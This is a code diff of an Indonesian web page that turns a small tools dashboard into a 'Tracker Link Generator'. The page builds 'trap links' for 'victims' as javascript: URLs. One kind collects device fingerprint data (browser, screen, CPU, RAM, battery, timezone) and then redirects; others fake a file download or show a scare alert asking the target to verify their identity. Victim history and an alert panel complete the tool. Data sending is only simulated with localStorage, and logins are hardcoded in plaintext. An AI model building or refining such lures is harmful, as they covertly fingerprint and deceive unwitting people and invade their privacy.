@@ -1,198 +1,885 @@
 <!DOCTYPE html>
 <html lang="id">
 <head>
-  <meta charset="UTF-8">
-  <title>Putra Tools</title>
+  <meta charset="UTF-8" />
+  <title>🎯 Tracker Link Generator (Live)</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
   <style>
     body {
-      font-family: "Segoe UI", Arial, sans-serif;
-      background: #0d1117;
-      color: #eee;
+      background: #0b0c10;
+      color: #e0e0e0;
+      font-family: 'Poppins', sans-serif;
       margin: 0;
+      padding: 20px;
       display: flex;
       justify-content: center;
-      align-items: center;
-      height: 100vh;
+      align-items: flex-start;
+      min-height: 100vh;
     }
-    .card {
-      background: #161b22;
-      padding: 25px;
-      border-radius: 16px;
-      box-shadow: 0 4px 15px rgba(0,0,0,0.5);
-      width: 350px;
+
+    h2 {
+      color: #f5f5f5;
       text-align: center;
-      display: none;
-      animation: fadeIn .4s ease;
+      margin-bottom: 20px;
+      font-weight: 600;
     }
-    .card.active { display: block; }
-    input, button {
-      width: 90%;
-      padding: 10px;
-      margin: 8px 0;
-      border-radius: 6px;
+
+    h3 {
+      color: #66fcf1;
+      margin-top: 0;
+      margin-bottom: 15px;
+      font-weight: 600;
+    }
+
+    input, button, select, textarea {
+      padding: 12px 16px;
+      border-radius: 12px;
+      font-size: 16px;
       border: none;
+      margin-bottom: 12px;
+      width: 100%;
+      box-sizing: border-box;
+      transition: all 0.2s ease;
     }
-    input { background: #0d1117; color: #eee; border: 1px solid #333; }
-    button { background: #238636; color: #fff; cursor: pointer; font-weight: bold; }
-    button:hover { background: #2ea043; }
-    h2 { margin-bottom: 15px; }
-    pre {
-      text-align: left;
+
+    input, select, textarea {
+      background: #1f2833;
+      color: #e0e0e0;
+      border: 1px solid #45a29e;
+    }
+
+    input:focus, select:focus, textarea:focus {
+      outline: none;
+      border-color: #66fcf1;
+      box-shadow: 0 0 8px #66fcf1;
+    }
+
+    button {
+      background: linear-gradient(90deg, #45a29e, #66fcf1);
+      color: #0b0c10;
+      font-weight: 600;
+      cursor: pointer;
+      border: 1px solid #45a29e;
+    }
+
+    button:hover {
+      background: linear-gradient(90deg, #66fcf1, #45a29e);
+      color: #0b0c10;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.3);
+    }
+
+    button.secondary {
+      background: linear-gradient(90deg, #1f2833, #16202c);
+      color: #66fcf1;
+      border: 1px solid #45a29e;
+    }
+
+    button.secondary:hover {
+      background: linear-gradient(90deg, #16202c, #1f2833);
+      box-shadow: 0 4px 12px rgba(102, 252, 241, 0.2);
+    }
+
+    button.danger {
+      background: linear-gradient(90deg, #8B0000, #FF4500);
+      color: white;
+    }
+
+    button.danger:hover {
+      background: linear-gradient(90deg, #FF4500, #8B0000);
+      box-shadow: 0 4px 12px rgba(255, 69, 0, 0.3);
+    }
+
+    .container {
+      width: 100%;
+      max-width: 600px;
+      background: #1c1c1c;
+      padding: 30px;
+      border-radius: 20px;
+      box-shadow: 0 0 30px rgba(0,0,0,0.6);
+      position: relative;
+    }
+
+    .logout-btn {
+      position: absolute;
+      top: 20px;
+      right: 20px;
+      width: auto;
+      padding: 8px 16px;
+      font-size: 14px;
+    }
+
+    .link-result {
+      font-size: 14px;
+      margin: 15px 0;
+      word-break: break-word;
+      padding: 10px;
+      background: #16202c;
+      border-radius: 12px;
+      border: 1px solid #45a29e;
+    }
+
+    .link-result a {
+      color: #66fcf1;
+      text-decoration: none;
+      font-weight: 500;
+    }
+
+    .victim-box {
+      margin-top: 20px;
+      background: #16202c;
+      border-radius: 16px;
+      padding: 18px;
+      font-size: 14px;
+      border: 1px solid #45a29e;
+      box-shadow: 0 0 15px rgba(0,0,0,0.4);
       white-space: pre-wrap;
-      background: #0d1117;
-      color: #eee;
+    }
+
+    .victim-box h3 {
+      margin-bottom: 12px;
+      font-size: 18px;
+      color: #66fcf1;
+      font-weight: 600;
+    }
+
+    img.snapshot {
+      max-width: 100%;
+      border-radius: 12px;
+      margin-top: 12px;
+      border: 1px solid #45a29e;
+    }
+
+    #loginBox p {
+      margin-top: -8px;
+      font-size: 14px;
+    }
+
+    .tab-container {
+      display: flex;
+      margin-bottom: 15px;
+      background: #1f2833;
+      border-radius: 12px;
+      overflow: hidden;
+    }
+
+    .tab {
+      flex: 1;
+      padding: 10px;
+      text-align: center;
+      cursor: pointer;
+      transition: background 0.3s;
+    }
+
+    .tab.active {
+      background: #45a29e;
+      font-weight: bold;
+    }
+
+    .tab-content {
+      display: none;
+    }
+
+    .tab-content.active {
+      display: block;
+    }
+
+    .copy-btn {
+      margin-top: 10px;
+      padding: 8px 12px;
+      font-size: 14px;
+    }
+
+    .history-item {
+      background: #1f2833;
       padding: 10px;
       border-radius: 8px;
-      max-height: 200px;
-      overflow-y: auto;
+      margin-bottom: 8px;
+      cursor: pointer;
     }
-    @keyframes fadeIn { from {opacity:0; transform:translateY(10px);} to {opacity:1; transform:translateY(0);} }
+
+    .history-item:hover {
+      background: #45a29e;
+    }
+
+    .api-key-box {
+      background: #16202c;
+      padding: 15px;
+      border-radius: 12px;
+      margin-bottom: 15px;
+      border: 1px solid #45a29e;
+    }
+
+    .api-key-item {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      padding: 10px;
+      background: #1f2833;
+      border-radius: 8px;
+      margin-bottom: 10px;
+    }
+
+    .api-key-name {
+      font-weight: bold;
+    }
+
+    .api-key-value {
+      font-family: monospace;
+      color: #66fcf1;
+      font-size: 14px;
+      word-break: break-all;
+      flex: 1;
+      padding: 0 10px;
+    }
+
+    .api-key-actions {
+      display: flex;
+      gap: 5px;
+    }
+
+    .api-key-btn {
+      padding: 5px 10px;
+      font-size: 12px;
+      width: auto;
+    }
+
+    .badge {
+      display: inline-block;
+      padding: 3px 8px;
+      border-radius: 10px;
+      font-size: 12px;
+      font-weight: bold;
+      margin-left: 5px;
+    }
+
+    .badge-active {
+      background: #4CAF50;
+      color: white;
+    }
+
+    .badge-inactive {
+      background: #f44336;
+      color: white;
+    }
+
+    .usage-stats {
+      font-size: 12px;
+      color: #ccc;
+      margin-top: 5px;
+    }
+
+    .endpoint-example {
+      background: #1f2833;
+      padding: 15px;
+      border-radius: 8px;
+      font-family: monospace;
+      font-size: 14px;
+      margin-top: 15px;
+      border: 1px solid #45a29e;
+    }
   </style>
 </head>
 <body>
-  <!-- Login -->
-  <div id="loginCard" class="card active">
-    <h2>🔑 Login</h2>
-    <input type="text" id="username" placeholder="Username"><br>
-    <input type="password" id="password" placeholder="Password"><br>
-    <button onclick="login()">Login</button>
+  <div class="container">
+
+    <!-- LOGIN -->
+    <div id="loginBox">
+      <h2>🔐 Login</h2>
+      <input type="text" id="username" placeholder="Username" />
+      <input type="password" id="password" placeholder="Password" />
+      <button onclick="login()">Login</button>
+      <p id="loginMsg" style="color:#ff6b6b;"></p>
+    </div>
+
+    <!-- KONTEN UTAMA -->
+    <div id="mainContent" style="display:none;">
+      <button class="logout-btn secondary" onclick="logout()">Logout</button>
+      <h2>🎯 Tracker Link Generator</h2>
+
+      <div class="tab-container">
+        <div class="tab active" onclick="switchTab('generator')">Generator</div>
+        <div class="tab" onclick="switchTab('history')">History</div>
+        <div class="tab" onclick="switchTab('alerts')">Alerts</div>
+        <div class="tab" onclick="switchTab('api')">API Keys</div>
+      </div>
+
+      <div id="generatorTab" class="tab-content active">
+        <form onsubmit="generateLink(event)">
+          <input type="url" id="target" placeholder="https://example.com" required />
+          <select id="method">
+            <option value="browser">Browser Redirect</option>
+            <option value="download">Download File</option>
+            <option value="alert">Alert Message</option>
+          </select>
+          <button type="submit">Generate Link</button>
+        </form>
+
+        <div class="link-result" id="generatedLink"></div>
+        <button class="copy-btn secondary" onclick="copyLink()" id="copyBtn" style="display:none;">Salin Link</button>
+
+        <div id="resultBox" class="victim-box" style="display: none;">
+          <h3>✅ Victim Information</h3>
+          <div id="resultOutput">Menunggu korban...</div>
+          <div id="mapBox" style="margin-top:10px;"></div>
+          <div id="imgBox" style="margin-top:10px;"></div>
+        </div>
+      </div>
+
+      <div id="historyTab" class="tab-content">
+        <h3>📜 History Korban</h3>
+        <div id="historyList"></div>
+      </div>
+
+      <div id="alertsTab" class="tab-content">
+        <h3>📢 Kirim Alert ke Korban</h3>
+        <form onsubmit="sendCustomAlert(event)">
+          <input type="text" id="customMsg" placeholder="Pesan alert ke korban..." />
+          <select id="victimSelector">
+            <option value="">Pilih Korban</option>
+          </select>
+          <button type="submit">Kirim Alert</button>
+        </form>
+      </div>
+
+      <div id="apiTab" class="tab-content">
+        <h3>🔑 API Key Management</h3>
+        <p>Buat dan kelola API Key untuk mengakses data tracking melalui API.</p>
+        
+        <div class="api-key-box">
+          <h4>Buat API Key Baru</h4>
+          <input type="text" id="apiKeyName" placeholder="Nama untuk API Key" />
+          <textarea id="apiKeyDescription" placeholder="Deskripsi (opsional)" rows="2"></textarea>
+          <button onclick="generateApiKey()">Buat API Key</button>
+        </div>
+        
+        <h4>API Keys Saya</h4>
+        <div id="apiKeysList"></div>
+        
+        <div class="endpoint-example">
+          <strong>Contoh penggunaan API:</strong><br><br>
+          <code>
+            // Mendapatkan data tracking<br>
+            fetch('/api/tracking-data?tracking_id=ABC123', {<br>
+            &nbsp;&nbsp;headers: {<br>
+            &nbsp;&nbsp;&nbsp;&nbsp;'Authorization': 'Bearer YOUR_API_KEY'<br>
+            &nbsp;&nbsp;}<br>
+            })<br>
+            .then(response => response.json())<br>
+            .then(data => console.log(data));
+          </code>
+        </div>
+      </div>
+    </div>
   </div>
 
-  <!-- Owner Dashboard -->
-  <div id="ownerCard" class="card">
-    <h2>👑 Owner Dashboard</h2>
-    <button onclick="generateToken()">Generate Token Member</button>
-    <p id="tokenResult"></p>
-    <button onclick="showCard('trackerCard')">Tracker Link Generator</button>
-    <button onclick="showCard('nikCard')">Lookup NIK</button>
-    <button onclick="showCard('noCard')">Cek Nomor</button>
-    <button onclick="logout()">Logout</button>
-  </div>
+  <script>
+    // ===== LOGIN =====
+    const validUsers = [
+      { user: "admin", pass: "1234" },
+      { user: "putra", pass: "putra123" }
+    ];
 
-  <!-- Member Dashboard -->
-  <div id="memberCard" class="card">
-    <h2>👤 Member Dashboard</h2>
-    <button onclick="showCard('trackerCard')">Tracker Link Generator</button>
-    <button onclick="showCard('nikCard')">Lookup NIK</button>
-    <button onclick="showCard('noCard')">Cek Nomor</button>
-    <button onclick="logout()">Logout</button>
-  </div>
+    function login() {
+      const username = document.getElementById("username").value.trim();
+      const password = document.getElementById("password").value.trim();
+      const msgBox = document.getElementById("loginMsg");
 
-  <!-- Tracker Generator -->
-  <div id="trackerCard" class="card">
-    <h2>📡 Tracker Generator</h2>
-    <input type="text" id="redirectUrl" placeholder="Redirect URL (ex: https://google.com)">
-    <button onclick="generateTracker()">Generate Link</button>
-    <pre id="trackerResult"></pre>
-    <button onclick="back()">⬅ Kembali</button>
-  </div>
+      const valid = validUsers.find(u => u.user === username && u.pass === password);
+      if (valid) {
+        msgBox.textContent = "✅ Login berhasil!";
+        msgBox.style.color = "#66fcf1";
+        document.getElementById("loginBox").style.display = "none";
+        document.getElementById("mainContent").style.display = "block";
+        
+        // Simpan info login
+        localStorage.setItem('tracker_current_user', username);
+        
+        // Load data setelah login
+        loadHistory();
+        updateVictimSelector();
+        loadApiKeys();
+      } else {
+        msgBox.textContent = "❌ Username atau password salah!";
+        msgBox.style.color = "#ff6b6b";
+      }
+    }
 
-  <!-- Lookup NIK -->
-  <div id="nikCard" class="card">
-    <h2>🆔 Lookup NIK</h2>
-    <input type="text" id="nikInput" placeholder="Masukkan NIK">
-    <button onclick="lookupNIK()">Cek</button>
-    <pre id="nikResult"></pre>
-    <button onclick="back()">⬅ Kembali</button>
-  </div>
+    function logout() {
+      document.getElementById("loginBox").style.display = "block";
+      document.getElementById("mainContent").style.display = "none";
+      document.getElementById("username").value = "";
+      document.getElementById("password").value = "";
+      document.getElementById("loginMsg").textContent = "";
+      localStorage.removeItem('tracker_current_user');
+    }
 
-  <!-- Cek Nomor -->
-  <div id="noCard" class="card">
-    <h2>📱 Cek Nomor HP</h2>
-    <input type="text" id="noInput" placeholder="08xxxxxxxxxx">
-    <button onclick="cekNo()">Cek</button>
-    <pre id="noResult"></pre>
-    <button onclick="back()">⬅ Kembali</button>
-  </div>
+    function switchTab(tabName) {
+      // Sembunyikan semua tab
+      document.querySelectorAll('.tab-content').forEach(tab => {
+        tab.classList.remove('active');
+      });
+      
+      // Nonaktifkan semua tab
+      document.querySelectorAll('.tab').forEach(tab => {
+        tab.classList.remove('active');
+      });
+      
+      // Aktifkan tab yang dipilih
+      document.getElementById(tabName + 'Tab').classList.add('active');
+      
+      // Aktifkan tombol tab
+      document.querySelectorAll('.tab').forEach(tab => {
+        if (tab.textContent.toLowerCase().includes(tabName)) {
+          tab.classList.add('active');
+        }
+      });
+    }
 
-  <!-- Tracker Page -->
-  <div id="trackerPage" class="card">
-    <h2>📊 Data Tracker</h2>
-    <pre id="trackerData"></pre>
-    <button onclick="goRedirect()">➡ Lanjut ke Redirect</button>
-  </div>
+    // ===== TRACKER FRONTEND =====
+    let currentCode = null;
+    let fetched = false;
+    let logs = [];
 
-<script>
-let role=null, memberToken="member123", redirectTarget="";
+    // Simulasi "server" dengan localStorage
+    function saveToServer(code, data) {
+      const existing = JSON.parse(localStorage.getItem('tracker_data') || '{}');
+      existing[code] = {
+        data: data,
+        timestamp: new Date().toISOString()
+      };
+      localStorage.setItem('tracker_data', JSON.stringify(existing));
+    }
 
-// login
-function login(){
-  const u=document.getElementById("username").value;
-  const p=document.getElementById("password").value;
-  if(u==="putraxyofficial12354" && p==="1234"){ role="owner"; showCard("ownerCard"); }
-  else if(u==="member" && p===memberToken){ role="member"; showCard("memberCard"); }
-  else alert("Login gagal");
-}
+    function getFromServer(code) {
+      const existing = JSON.parse(localStorage.getItem('tracker_data') || '{}');
+      return existing[code] || null;
+    }
 
-function logout(){ role=null; showCard("loginCard"); }
+    function getAllFromServer() {
+      return JSON.parse(localStorage.getItem('tracker_data') || '{}');
+    }
 
-function showCard(id){
-  document.querySelectorAll(".card").forEach(c=>c.classList.remove("active"));
-  document.getElementById(id).classList.add("active");
-}
+    function generateLink(e) {
+      e.preventDefault();
+      const input = document.getElementById("target").value.trim();
+      const method = document.getElementById("method").value;
+      if (!input) return;
 
-function back(){
-  if(role==="owner") showCard("ownerCard"); else showCard("memberCard");
-}
+      const code = Math.random().toString(36).substring(2, 10);
+      currentCode = code;
 
-function generateToken(){
-  memberToken=Math.random().toString(36).substring(2,8);
-  document.getElementById("tokenResult").innerText="Token Member: "+memberToken;
-}
+      // Simpan data awal
+      saveToServer(code, { status: 'pending', target: input });
 
-function generateTracker(){
-  const url=document.getElementById("redirectUrl").value||"https://google.com";
-  const link=window.location.href.split("#")[0]+"#tracker?redirect="+encodeURIComponent(url);
-  document.getElementById("trackerResult").innerText=link;
-}
+      // Buat link jebakan berdasarkan metode yang dipilih
+      let link = "";
+      
+      if (method === "browser") {
+        link = `javascript:(function(){
+          const collectData = async function() {
+            let batteryInfo = null;
+            try {
+              if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                batteryInfo = {
+                  level: battery.level,
+                  charging: battery.charging,
+                  chargingTime: battery.chargingTime,
+                  dischargingTime: battery.dischargingTime
+                };
+              }
+            } catch(e) {
+              batteryInfo = { error: e.message };
+            }
+            
+            const info = {
+              ip: '127.0.0.1', // Ini akan diganti dengan IP asli di implementasi nyata
+              access_time: new Date().toLocaleTimeString(),
+              local_time: new Date().toLocaleString(),
+              user_agent: navigator.userAgent,
+              platform: navigator.platform,
+              screen: window.screen.width + 'x' + window.screen.height,
+              window: window.innerWidth + 'x' + window.innerHeight,
+              orientation: screen.orientation?.type || 'unknown',
+              dpr: window.devicePixelRatio,
+              cpu: navigator.hardwareConcurrency,
+              ram: navigator.deviceMemory || 'N/A',
+              language: navigator.language,
+              timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+              touch: 'ontouchstart' in window,
+              maxTouchPoints: navigator.maxTouchPoints,
+              cookies: navigator.cookieEnabled,
+              online: navigator.onLine,
+              doNotTrack: navigator.doNotTrack,
+              webdriver: navigator.webdriver || false,
+              pdfViewerEnabled: navigator.pdfViewerEnabled || false,
+              battery: batteryInfo,
+              tracker_id: '${code}'
+            };
+            
+            // Simulasi pengiriman data ke server
+            try {
+              localStorage.setItem('tracker_last_data', JSON.stringify(info));
+              console.log('Data collected:', info);
+            } catch(e) {
+              console.error('Error saving data:', e);
+            }
+            
+            // Redirect ke target
+            window.location.href = '${input}';
+          };
+          collectData();
+        })()`;
+      } else if (method === "download") {
+        link = `javascript:(function(){
+          alert('File Anda sedang didownload...');
+          const link = document.createElement('a');
+          link.href = '${input}';
+          link.download = 'document.pdf';
+          document.body.appendChild(link);
+          link.click();
+          document.body.removeChild(link);
+        })()`;
+      } else if (method === "alert") {
+        link = `javascript:(function(){
+          alert('Sistem mendeteksi masalah keamanan. Harap verifikasi identitas Anda.');
+          window.location.href = '${input}';
+        })()`;
+      }
 
-function lookupNIK(){
-  const nik=document.getElementById("nikInput").value;
-  if(nik.length<8){document.getElementById("nikResult").innerText="NIK tidak valid";return;}
-  const lahir="200"+nik[6]+"-"+nik[4]+nik[5]+"-"+nik[2]+nik[3];
-  const gender=parseInt(nik[6])%2===0?"Laki-laki":"Perempuan";
-  const kota="Kota "+nik.substring(0,2);
-  document.getElementById("nikResult").innerText=`Tanggal Lahir: ${lahir}\nJenis Kelamin: ${gender}\nKota: ${kota}`;
-}
+      document.getElementById("generatedLink").innerHTML = `🔗 <a href="${link}" id="trackerLink">Klik Link Jebakan</a>`;
+      document.getElementById("copyBtn").style.display = "block";
+      document.getElementById("resultOutput").textContent = "Menunggu korban...";
+      document.getElementById("resultBox").style.display = "block";
+      
+      // Mulai memeriksa data
+      checkForData();
+    }
 
-function cekNo(){
-  const no=document.getElementById("noInput").value;
-  let provider="Tidak dikenal";
-  if(no.startsWith("0812")) provider="Telkomsel";
-  else if(no.startsWith("0857")) provider="Indosat";
-  else if(no.startsWith("0838")) provider="Axis";
-  const aktif=no.length>=10?"Aktif":"Tidak Aktif";
-  document.getElementById("noResult").innerText=`Provider: ${provider}\nStatus: ${aktif}`;
-}
+    function copyLink() {
+      const link = document.getElementById("trackerLink").href;
+      navigator.clipboard.writeText(link).then(() => {
+        alert("Link berhasil disalin!");
+      });
+    }
 
-function collectDevice(){
-  return {
-    userAgent:navigator.userAgent,
-    platform:navigator.platform,
-    language:navigator.language,
-    screen:screen.width+"x"+screen.height,
-    window:window.innerWidth+"x"+window.innerHeight,
-    online:navigator.onLine,
-    cookies:navigator.cookieEnabled,
-    timezone:Intl.DateTimeFormat().resolvedOptions().timeZone
-  };
-}
+    function checkForData() {
+      if (!currentCode) return;
+      
+      // Periksa data dari "server" setiap 2 detik
+      const checkInterval = setInterval(() => {
+        const data = getFromServer(currentCode);
+        if (data && data.status === 'completed') {
+          clearInterval(checkInterval);
+          renderFullResult(data.victimData);
+          saveToHistory(data.victimData);
+          loadHistory();
+          updateVictimSelector();
+        }
+      }, 2000);
+    }
 
-function showTrackerPage(){
-  showCard("trackerPage");
-  const d=collectDevice();
-  document.getElementById("trackerData").innerText=JSON.stringify(d,null,2);
-}
+    function renderFullResult(v) {
+      if (!v) {
+        document.getElementById("resultOutput").textContent = "Tidak ada data korban yang diterima.";
+        return;
+      }
+      
+      const result = `
+⚓ IP: ${v.ip} | Time: ${v.access_time}
+⏳ Date In Victim's Device : ${v.local_time}
 
-function goRedirect(){window.location.href=redirectTarget;}
+📱 DEVICE OVERVIEW
+📲 User Agent: ${v.user_agent}
+💻 Operating System: ${parseOS(v.user_agent)}
+🌐 Browser: ${parseBrowser(v.user_agent)}
+🔧 Platform: ${v.platform || 'N/A'}
 
-window.onload=()=>{
-  if(location.hash.startsWith("#tracker")){
-    const url=new URLSearchParams(location.hash.split("?")[1]);
-    redirectTarget=url.get("redirect")||"https://google.com";
-    showTrackerPage();
-  }
-};
-</script>
+🖥️ DISPLAY DETAILS
+📐 Screen Size: ${v.screen}
+🪟 Window Size: ${v.window}
+🔄 Orientation: ${v.orientation || 'unknown'}
+📊 Pixel Density: ${v.dpr}x
+
+⚡ PERFORMANCE INFO
+🧠 CPU Cores: ${v.cpu}
+💾 Device RAM: ${v.ram}
+🌍 Language: ${v.language}
+🕐 Timezone: ${v.timezone}
+
+👆 INPUT CAPABILITIES
+📱 Touch Screen: ${v.touch ? '✅ Yes' : '❌ No'}
+🖐️ Max Touch Points: ${v.maxTouchPoints || 'N/A'}
+🍪 Cookies: ${v.cookies ? '✅ Enabled' : '❌ Disabled'}
+🌐 Online Status: ${v.online ? '✅ Connected' : '❌ Disconnected'}
+
+🔒 SECURITY FEATURES
+🚫 Do Not Track: ${v.doNotTrack === '1' ? '✅ Enabled' : '❌ Disabled'}
+🤖 Webdriver: ${v.webdriver ? '❌ Detected' : '✅ Not Detected'}
+📄 PDF Viewer: ${v.pdfViewerEnabled ? '✅ Available' : '❌ Not Available'}
+      `;
+      
+      // Tambahkan info baterai jika tersedia
+      let batteryInfo = "";
+      if (v.battery) {
+        if (v.battery.error) {
+          batteryInfo = `🔋 Battery: Error: ${v.battery.error}\n`;
+        } else {
+          batteryInfo = `🔋 Battery: Level: ${v.battery.level * 100}%, Charging: ${v.battery.charging ? 'Yes' : 'No'}\n`;
+        }
+        document.getElementById("resultOutput").textContent = result + batteryInfo;
+      } else {
+        document.getElementById("resultOutput").textContent = result;
+      }
+    }
+
+    function parseOS(ua) {
+      if (!ua) return "Unknown";
+      if (ua.includes("Android")) return "Android";
+      if (ua.includes("iPhone") || ua.includes("iPad")) return "iOS";
+      if (ua.includes("Windows")) return "Windows";
+      if (ua.includes("Mac")) return "macOS";
+      if (ua.includes("Linux")) return "Linux";
+      return "Unknown";
+    }
+
+    function parseBrowser(ua) {
+      if (!ua) return "Unknown";
+      if (ua.includes("Chrome") && !ua.includes("Edg")) return "Chrome";
+      if (ua.includes("Firefox")) return "Firefox";
+      if (ua.includes("Safari") && !ua.includes("Chrome")) return "Safari";
+      if (ua.includes("Edg")) return "Edge";
+      if (ua.includes("Opera") || ua.includes("OPR")) return "Opera";
+      return "Unknown";
+    }
+
+    function saveToHistory(victimData) {
+      const history = JSON.parse(localStorage.getItem('tracker_history') || '[]');
+      history.unshift({
+        id: victimData.tracker_id || Math.random().toString(36).substring(2, 10),
+        data: victimData,
+        timestamp: new Date().toISOString()
+      });
+      
+      // Simpan hanya 10 item terakhir
+      if (history.length > 10) {
+        history.pop();
+      }
+      
+      localStorage.setItem('tracker_history', JSON.stringify(history));
+    }
+
+    function loadHistory() {
+      const history = JSON.parse(localStorage.getItem('tracker_history') || '[]');
+      const historyList = document.getElementById('historyList');
+      
+      if (history.length === 0) {
+        historyList.innerHTML = '<p>Tidak ada history</p>';
+        return;
+      }
+      
+      historyList.innerHTML = '';
+      history.forEach(item => {
+        const historyItem = document.createElement('div');
+        historyItem.className = 'history-item';
+        historyItem.innerHTML = `
+          <strong>${item.data.ip || 'Unknown IP'}</strong> - 
+          ${new Date(item.timestamp).toLocaleString()} -
+          ${parseOS(item.data.user_agent)} / ${parseBrowser(item.data.user_agent)}
+        `;
+        historyItem.onclick = () => {
+          renderFullResult(item.data);
+          document.getElementById('resultBox').style.display = 'block';
+          switchTab('generator');
+        };
+        historyList.appendChild(historyItem);
+      });
+    }
+
+    function updateVictimSelector() {
+      const history = JSON.parse(localStorage.getItem('tracker_history') || '[]');
+      const selector = document.getElementById('victimSelector');
+      
+      // Simpan nilai yang dipilih sebelumnya
+      const currentValue = selector.value;
+      
+      // Kosongkan selector
+      selector.innerHTML = '<option value="">Pilih Korban</option>';
+      
+      // Tambahkan opsi dari history
+      history.forEach(item => {
+        const option = document.createElement('option');
+        option.value = item.id;
+        option.textContent = `${item.data.ip || 'Unknown IP'} - ${new Date(item.timestamp).toLocaleDateString()}`;
+        selector.appendChild(option);
+      });
+      
+      // Kembalikan nilai yang dipilih sebelumnya jika masih ada
+      if (currentValue) {
+        selector.value = currentValue;
+      }
+    }
+
+    function sendCustomAlert(e) {
+      e.preventDefault();
+      const msg = document.getElementById("customMsg").value.trim();
+      const victimId = document.getElementById("victimSelector").value;
+      
+      if (!msg) {
+        alert("Harap masukkan pesan!");
+        return;
+      }
+      
+      if (!victimId) {
+        alert("Harap pilih korban!");
+        return;
+      }
+      
+      // Simulasi pengiriman alert
+      alert(`📢 Alert dikirim ke korban: ${msg}`);
+      document.getElementById("customMsg").value = "";
+    }
+
+    // ===== API KEY MANAGEMENT =====
+    function generateApiKey() {
+      const name = document.getElementById("apiKeyName").value.trim();
+      const description = document.getElementById("apiKeyDescription").value.trim();
+      
+      if (!name) {
+        alert("Harap beri nama untuk API Key!");
+        return;
+      }
+      
+      // Generate random API key
+      const apiKey = generateSecureApiKey();
+      const currentUser = localStorage.getItem('tracker_current_user') || 'unknown';
+      
+      // Simpan API key
+      const apiKeys = JSON.parse(localStorage.getItem('tracker_api_keys') || '{}');
+      if (!apiKeys[currentUser]) {
+        apiKeys[currentUser] = [];
+      }
+      
+      const newKey = {
+        id: Math.random().toString(36).substring(2, 10),
+        name: name,
+        description: description,
+        key: apiKey,
+        created: new Date().toISOString(),
+        lastUsed: null,
+        usageCount: 0,
+        active: true
+      };
+      
+      apiKeys[currentUser].push(newKey);
+      localStorage.setItem('tracker_api_keys', JSON.stringify(apiKeys));
+      
+      // Reset form
+      document.getElementById("apiKeyName").value = "";
+      document.getElementById("apiKeyDescription").value = "";
+      
+      // Reload daftar API keys
+      loadApiKeys();
+      
+      // Tampilkan API key kepada pengguna
+      alert(`API Key berhasil dibuat!\n\nSimpan dengan aman, karena tidak akan ditampilkan lagi:\n\n${apiKey}`);
+    }
+    
+    function generateSecureApiKey() {
+      const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_';
+      let result = 'tk_';
+      for (let i = 0; i < 32; i++) {
+        result += chars.charAt(Math.floor(Math.random() * chars.length));
+      }
+      return result;
+    }
+    
+    function loadApiKeys() {
+      const currentUser = localStorage.getItem('tracker_current_user');
+      const apiKeys = JSON.parse(localStorage.getItem('tracker_api_keys') || '{}');
+      const userKeys = apiKeys[currentUser] || [];
+      const apiKeysList = document.getElementById('apiKeysList');
+      
+      if (userKeys.length === 0) {
+        apiKeysList.innerHTML = '<p>Anda belum memiliki API Key.</p>';
+        return;
+      }
+      
+      apiKeysList.innerHTML = '';
+      userKeys.forEach(key => {
+        const keyItem = document.createElement('div');
+        keyItem.className = 'api-key-item';
+        
+        keyItem.innerHTML = `
+          <div>
+            <div class="api-key-name">${key.name} 
+              <span class="badge ${key.active ? 'badge-active' : 'badge-inactive'}">${key.active ? 'Aktif' : 'Nonaktif'}</span>
+            </div>
+            <div class="api-key-value">${key.key}</div>
+            <div class="usage-stats">
+              Dibuat: ${new Date(key.created).toLocaleDateString()} | 
+              Digunakan: ${key.usageCount} kali
+              ${key.lastUsed ? `| Terakhir: ${new Date(key.lastUsed).toLocaleDateString()}` : ''}
+            </div>
+            ${key.description ? `<div class="usage-stats">${key.description}</div>` : ''}
+          </div>
+          <div class="api-key-actions">
+            <button class="api-key-btn secondary" onclick="toggleApiKey('${key.id}')">${key.active ? 'Nonaktifkan' : 'Aktifkan'}</button>
+            <button class="api-key-btn danger" onclick="deleteApiKey('${key.id}')">Hapus</button>
+          </div>
+        `;
+        
+        apiKeysList.appendChild(keyItem);
+      });
+    }
+    
+    function toggleApiKey(keyId) {
+      const currentUser = localStorage.getItem('tracker_current_user');
+      const apiKeys = JSON.parse(localStorage.getItem('tracker_api_keys') || '{}');
+      const userKeys = apiKeys[currentUser] || [];
+      
+      const keyIndex = userKeys.findIndex(k => k.id === keyId);
+      if (keyIndex !== -1) {
+        userKeys[keyIndex].active = !userKeys[keyIndex].active;
+        apiKeys[currentUser] = userKeys;
+        localStorage.setItem('tracker_api_keys', JSON.stringify(apiKeys));
+        loadApiKeys();
+      }
+    }
+    
+    function deleteApiKey(keyId) {
+      if (!confirm("Apakah Anda yakin ingin menghapus API Key ini? Tindakan ini tidak dapat dibatalkan.")) {
+        return;
+      }
+      
+      const currentUser = localStorage.getItem('tracker_current_user');
+      const apiKeys = JSON.parse(localStorage.getItem('tracker_api_keys') || '{}');
+      const userKeys = apiKeys[currentUser] || [];
+      
+      const keyIndex = userKeys.findIndex(k => k.id === keyId);
+      if (keyIndex !== -1) {
+        userKeys.splice(keyIndex, 1);
+        apiKeys[currentUser] = userKeys;
+        localStorage.setItem('tracker_api_keys', JSON.stringify(apiKeys));
+        loadApiKeys();
+      }
+    }
+
+    // Inisialisasi
+    window.onload = function() {
+      // Coba login otomatis jika sudah login sebelumnya (simulasi session)
+      const currentUser = localStorage.getItem('tracker_current_user');
+      if (currentUser) {
+        document.getElementById("username").value = currentUser;
+        document.getElementById("password").value = "••••••••";
+        login();
+      }
+      
+      // Load API keys jika sudah login
+      if (document.getElementById("mainContent").style.display === "block") {
+        loadApiKeys();
+      }
+    };
+  </script>
 </body>
-</html>
+  </html>
